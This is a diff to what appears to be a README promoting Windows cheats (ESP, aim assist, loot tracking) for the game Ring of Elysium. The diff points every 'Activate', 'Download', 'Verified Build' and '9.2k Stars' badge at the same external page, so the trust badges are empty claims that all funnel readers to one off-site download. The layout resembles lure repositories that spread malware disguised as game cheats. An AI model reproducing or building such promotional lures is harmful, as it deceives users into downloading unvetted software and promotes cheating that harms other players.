@@ -23,10 +23,10 @@ Built for **Windows PC players**, these cheats are **modular and customizable**.
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 9.2k Stars](https://img.shields.io/badge/GitHub-9.2k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://roe-cheats.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://roe-cheats.github.io/.github/)
+[![⭐️ 9.2k Stars](https://img.shields.io/badge/GitHub-9.2k_Stars-green?logo=github\&style=for-the-badge)](https://roe-cheats.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://roe-cheats.github.io/.github/)
 
 ---
 
@@ -160,7 +160,7 @@ A: It lowers detection risk, but no cheat is 100% undetectable.
 
 The **Ring of Elysium Cheats** package blends **ESP overlays, aim assist, and loot tracking** into one powerful toolkit. Whether you’re hunting enemies, farming rare loot, or navigating snowstorms, this tool ensures unmatched awareness and precision.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://roe-cheats.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://roe-cheats.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://roe-cheats.github.io/.github/)
 
